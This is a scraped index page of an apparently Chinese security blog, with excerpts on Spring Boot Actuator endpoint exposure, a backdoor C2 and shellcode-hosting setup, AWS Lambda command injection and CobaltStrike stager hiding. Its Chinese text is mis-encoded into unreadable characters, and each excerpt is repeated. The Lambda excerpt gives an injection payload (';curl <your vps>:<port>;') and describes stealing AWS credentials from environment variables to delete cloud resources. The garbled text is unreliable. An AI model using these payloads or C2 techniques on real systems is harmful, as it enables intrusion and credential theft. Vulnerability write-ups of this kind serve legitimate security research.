			<a href="/2021/05/27/spring-boot-actuator.html" >Spring Boot Actuatoræ¼æ´å¤ç°</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-27  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="0x01-åŸºæœ¬çŸ¥è¯†"><a href="#0x01-åŸºæœ¬çŸ¥è¯†" class="headerlink" title="0x01. åŸºæœ¬çŸ¥è¯†"></a>0x01. åŸºæœ¬çŸ¥è¯†</h3><ol>
<li>åœ¨pom.xmlé‡Œé¢æœ‰è¿™æ ·çš„é…ç½®</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">
&lt;dependency&gt;
   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>æ²¡æœ‰å¼€å¯å®‰å…¨è®¾ç½®</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">management:
  security:
    enabled: false
  health:
    elasticsearch:
      enabled: false
  metrics:
    export:
      prometheus:
        enabled: true
      jmx:
        enabled: true
  endpoints:
    web:
      exposure:
        include: &#39;*&#39;
      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æœåŠ¡ç«¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥æ”¹å˜Actuatorçš„æ ¹è·¯å¾„ï¼š<code>management.endpoints.web.base-path=/monitor</code></p>
<p>  æœç´¢githubçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„è®¾ç½®ï¼š</p>
<h3 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h3><p>åœ¨é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå¯èƒ½æš´éœ²ä»¥ä¸‹è·¯ç”±:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
&#x2F;auditevents
&#x2F;autoconfig
&#x2F;beans
&#x2F;caches
&#x2F;conditions
&#x2F;configprops
&#x2F;docs
&#x2F;dump
&#x2F;env
&#x2F;flyway
&#x2F;health
&#x2F;heapdump
&#x2F;httptrace
&#x2F;info
&#x2F;intergrationgraph
&#x2F;jolokia
&#x2F;logfile
&#x2F;loggers
&#x2F;liquibase
&#x2F;metrics
&#x2F;mappings
&#x2F;prometheus
&#x2F;refresh
&#x2F;scheduledtasks
&#x2F;sessions
&#x2F;shutdown
&#x2F;trace
&#x2F;threaddump
&#x2F;actuator&#x2F;auditevents
&#x2F;actuator&#x2F;beans
&#x2F;actuator&#x2F;health
&#x2F;actuator&#x2F;conditions
&#x2F;actuator&#x2F;configprops
&#x2F;actuator&#x2F;env
&#x2F;actuator&#x2F;info
&#x2F;actuator&#x2F;loggers
&#x2F;actuator&#x2F;heapdump
&#x2F;actuator&#x2F;threaddump
&#x2F;actuator&#x2F;metrics
&#x2F;actuator&#x2F;scheduledtasks
&#x2F;actuator&#x2F;httptrace
&#x2F;actuator&#x2F;mappings
&#x2F;actuator&#x2F;jolokia
&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="0x01-åŸºæœ¬çŸ¥è¯†"><a href="#0x01-åŸºæœ¬çŸ¥è¯†" class="headerlink" title="0x01. åŸºæœ¬çŸ¥è¯†"></a>0x01. åŸºæœ¬çŸ¥è¯†</h3><ol>
<li>åœ¨pom.xmlé‡Œé¢æœ‰è¿™æ ·çš„é…ç½®</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">
&lt;dependency&gt;
   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>æ²¡æœ‰å¼€å¯å®‰å…¨è®¾ç½®</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">management:
  security:
    enabled: false
  health:
    elasticsearch:
      enabled: false
  metrics:
    export:
      prometheus:
        enabled: true
      jmx:
        enabled: true
  endpoints:
    web:
      exposure:
        include: &#39;*&#39;
      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æœåŠ¡ç«¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥æ”¹å˜Actuatorçš„æ ¹è·¯å¾„ï¼š<code>management.endpoints.web.base-path=/monitor</code></p>
<p>  æœç´¢githubçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„è®¾ç½®ï¼š</p>
<h3 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h3><p>åœ¨é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå¯èƒ½æš´éœ²ä»¥ä¸‹è·¯ç”±:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
&#x2F;auditevents
&#x2F;autoconfig
&#x2F;beans
&#x2F;caches
&#x2F;conditions
&#x2F;configprops
&#x2F;docs
&#x2F;dump
&#x2F;env
&#x2F;flyway
&#x2F;health
&#x2F;heapdump
&#x2F;httptrace
&#x2F;info
&#x2F;intergrationgraph
&#x2F;jolokia
&#x2F;logfile
&#x2F;loggers
&#x2F;liquibase
&#x2F;metrics
&#x2F;mappings
&#x2F;prometheus
&#x2F;refresh
&#x2F;scheduledtasks
&#x2F;sessions
&#x2F;shutdown
&#x2F;trace
&#x2F;threaddump
&#x2F;actuator&#x2F;auditevents
&#x2F;actuator&#x2F;beans
&#x2F;actuator&#x2F;health
&#x2F;actuator&#x2F;conditions
&#x2F;actuator&#x2F;configprops
&#x2F;actuator&#x2F;env
&#x2F;actuator&#x2F;info
&#x2F;actuator&#x2F;loggers
&#x2F;actuator&#x2F;heapdump
&#x2F;actuator&#x2F;threaddump
&#x2F;actuator&#x2F;metrics
&#x2F;actuator&#x2F;scheduledtasks
&#x2F;actuator&#x2F;httptrace
&#x2F;actuator&#x2F;mappings
&#x2F;actuator&#x2F;jolokia
&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/06/defense-from-c2.html" >é˜²å¾¡æ€§C2ç©å…·å°è¯•</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="èƒŒæ™¯éœ€æ±‚"><a href="#èƒŒæ™¯éœ€æ±‚" class="headerlink" title="èƒŒæ™¯éœ€æ±‚"></a>èƒŒæ™¯éœ€æ±‚</h3><p>ä¸ç®¡ä¸€ä¸ªä»€ä¹ˆå½¢å¼çš„åé—¨ï¼šå®šæ—¶ä»»åŠ¡ã€dllåŠ«æŒã€å¼€æœºå¯åŠ¨â€¦ï¼Œå½“æˆ‘è®¾ç½®çš„åé—¨è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘æƒ³æŒæ¡åé—¨çš„å¯åŠ¨æ—¶é—´ã€è§¦å‘IPç­‰ä¸Šç¯å¢ƒï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æ˜¯åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šåšäº†å°è¯•æ€§æ‰©å±•</p>
<h4 id="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"><a href="#è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š" class="headerlink" title="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"></a>è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š</h4><ul>
<li>åé—¨è¢«é™æ€åˆ†æ</li>
<li>åé—¨è¢«åŠ¨æ€åˆ†æ</li>
<li>shellcodeè¢«æå–ä¹‹åè§¦å‘</li>
<li>â€¦</li>
</ul>
<p>åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šæ‰©å±•è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚è¿œç¨‹shellcodeæ‰˜ç®¡æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå¢åŠ ä¸€ä¸ªæœºå™¨äººï¼Œç„¶åå‘èµ·ä¸€ä¸ªä¸Šçº¿é€šçŸ¥ï¼šIf This Then Thatï¼Œè¿™æ ·å¤ªç®€å•äº†ï¼Œæˆ‘ä»¬å†å¤šåŠ ç‚¹æ–™ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li>ä¸å¸¦åˆç†å‚æ•°è¯·æ±‚shellcodeçš„URLæ—¶å€™ï¼Œå‘èµ·è­¦å‘Š</li>
<li>å½“æœ¨é©¬è¿è¡Œåœ¨æ¶æ„ç¯å¢ƒçš„æ—¶å€™ï¼Œå‘èµ·è­¦å‘Š<ul>
<li>å½“æœ¨é©¬ä¸Šçº¿IPä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li>
<li>å½“æœ¨é©¬ä¸Šçº¿ä¸»æœºçš„è®¾å¤‡æŒ‡çº¹ä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li>
</ul>
</li>
<li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥å…³é—­æ‰“å¼€</li>
<li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥æ–°å¢åˆ é™¤æœ¨é©¬ä¸Šçº¿IPæˆ–è€…è®¾å¤‡æŒ‡çº¹</li>
</ol>
<h3 id="å‡†å¤‡ææ–™"><a href="#å‡†å¤‡ææ–™" class="headerlink" title="å‡†å¤‡ææ–™"></a>å‡†å¤‡ææ–™</h3><ul>
<li>ä¸€å°VPSï¼šæ‰˜ç®¡shellcodeï¼Œé€šçŸ¥slackæœºå™¨äºº</li>
<li>ä¸€ä¸ªAWSè´¦å·éšè—C2ï¼ˆCloudFrontï¼‰</li>
<li>Slackï¼šæ¥æ”¶é€šçŸ¥ï¼Œä½¿ç”¨<code>Slash commands</code>åŠŸèƒ½æ§åˆ¶shellcodeæ‰˜ç®¡æœåŠ¡</li>
</ul>
<h5 id="æ‰˜ç®¡shellcodeæµç¨‹"><a href="#æ‰˜ç®¡shellcodeæµç¨‹" class="headerlink" title="æ‰˜ç®¡shellcodeæµç¨‹"></a>æ‰˜ç®¡shellcodeæµç¨‹</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
	

	</div>
  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="èƒŒæ™¯éœ€æ±‚"><a href="#èƒŒæ™¯éœ€æ±‚" class="headerlink" title="èƒŒæ™¯éœ€æ±‚"></a>èƒŒæ™¯éœ€æ±‚</h3><p>ä¸ç®¡ä¸€ä¸ªä»€ä¹ˆå½¢å¼çš„åé—¨ï¼šå®šæ—¶ä»»åŠ¡ã€dllåŠ«æŒã€å¼€æœºå¯åŠ¨â€¦ï¼Œå½“æˆ‘è®¾ç½®çš„åé—¨è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘æƒ³æŒæ¡åé—¨çš„å¯åŠ¨æ—¶é—´ã€è§¦å‘IPç­‰ä¸Šç¯å¢ƒï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æ˜¯åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šåšäº†å°è¯•æ€§æ‰©å±•</p>
<h4 id="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"><a href="#è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š" class="headerlink" title="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"></a>è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š</h4><ul>
<li>åé—¨è¢«é™æ€åˆ†æ</li>
<li>åé—¨è¢«åŠ¨æ€åˆ†æ</li>
<li>shellcodeè¢«æå–ä¹‹åè§¦å‘</li>
<li>â€¦</li>
</ul>
<p>åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šæ‰©å±•è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚è¿œç¨‹shellcodeæ‰˜ç®¡æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå¢åŠ ä¸€ä¸ªæœºå™¨äººï¼Œç„¶åå‘èµ·ä¸€ä¸ªä¸Šçº¿é€šçŸ¥ï¼šIf This Then Thatï¼Œè¿™æ ·å¤ªç®€å•äº†ï¼Œæˆ‘ä»¬å†å¤šåŠ ç‚¹æ–™ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li>ä¸å¸¦åˆç†å‚æ•°è¯·æ±‚shellcodeçš„URLæ—¶å€™ï¼Œå‘èµ·è­¦å‘Š</li>
<li>å½“æœ¨é©¬è¿è¡Œåœ¨æ¶æ„ç¯å¢ƒçš„æ—¶å€™ï¼Œå‘èµ·è­¦å‘Š<ul>
<li>å½“æœ¨é©¬ä¸Šçº¿IPä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li>
<li>å½“æœ¨é©¬ä¸Šçº¿ä¸»æœºçš„è®¾å¤‡æŒ‡çº¹ä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li>
</ul>
</li>
<li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥å…³é—­æ‰“å¼€</li>
<li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥æ–°å¢åˆ é™¤æœ¨é©¬ä¸Šçº¿IPæˆ–è€…è®¾å¤‡æŒ‡çº¹</li>
</ol>
<h3 id="å‡†å¤‡ææ–™"><a href="#å‡†å¤‡ææ–™" class="headerlink" title="å‡†å¤‡ææ–™"></a>å‡†å¤‡ææ–™</h3><ul>
<li>ä¸€å°VPSï¼šæ‰˜ç®¡shellcodeï¼Œé€šçŸ¥slackæœºå™¨äºº</li>
<li>ä¸€ä¸ªAWSè´¦å·éšè—C2ï¼ˆCloudFrontï¼‰</li>
<li>Slackï¼šæ¥æ”¶é€šçŸ¥ï¼Œä½¿ç”¨<code>Slash commands</code>åŠŸèƒ½æ§åˆ¶shellcodeæ‰˜ç®¡æœåŠ¡</li>
</ul>
<h5 id="æ‰˜ç®¡shellcodeæµç¨‹"><a href="#æ‰˜ç®¡shellcodeæµç¨‹" class="headerlink" title="æ‰˜ç®¡shellcodeæµç¨‹"></a>æ‰˜ç®¡shellcodeæµç¨‹</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
	
	</div>
  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/01/aws-lambda-rce.html" >Lambdaè¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯•</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>æ”»å‡»çš„Payloadï¼š <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚</p>
<h5 id="ä¿®å¤ä»£ç "><a href="#ä¿®å¤ä»£ç " class="headerlink" title="ä¿®å¤ä»£ç :"></a>ä¿®å¤ä»£ç :</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h3><ul>
<li>Lambdaå‡½æ•°ä»£ç è·¯å¾„: <code>/var/task</code></li>
<li>ç”¨æˆ·å‡­è¯: å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œ<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
<li>æ–‡ä»¶ç³»ç»Ÿ: <code>/var/task</code>åªè¯»ï¼Œ<code>/tmp</code>å¯å†™</li>
<li>é»˜è®¤ç”¨æˆ·: <code>sbx_userxxx</code></li>
<li>Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³</li>
<li>æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰</li>
</ul>
<p>åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨<code>awscli</code>å†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡<code>awscli</code>æ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»º<code>Lambda</code>çš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨<code>awscli</code>æ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚</p>
<p>å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯<code>is not authorized to perform</code>ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š</p>
	

	</div>
  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>æ”»å‡»çš„Payloadï¼š <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚</p>
<h5 id="ä¿®å¤ä»£ç "><a href="#ä¿®å¤ä»£ç " class="headerlink" title="ä¿®å¤ä»£ç :"></a>ä¿®å¤ä»£ç :</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h3><ul>
<li>Lambdaå‡½æ•°ä»£ç è·¯å¾„: <code>/var/task</code></li>
<li>ç”¨æˆ·å‡­è¯: å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œ<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
<li>æ–‡ä»¶ç³»ç»Ÿ: <code>/var/task</code>åªè¯»ï¼Œ<code>/tmp</code>å¯å†™</li>
<li>é»˜è®¤ç”¨æˆ·: <code>sbx_userxxx</code></li>
<li>Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³</li>
<li>æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰</li>
</ul>
<p>åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨<code>awscli</code>å†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡<code>awscli</code>æ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»º<code>Lambda</code>çš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨<code>awscli</code>æ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚</p>
<p>å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯<code>is not authorized to perform</code>ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š</p>
	
	</div>
  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/01/04/CloudFront-find-cobaltstrike.html" >CobaltStrikeçš„Stagerç‰¹å¾éšè—</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-01-04  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
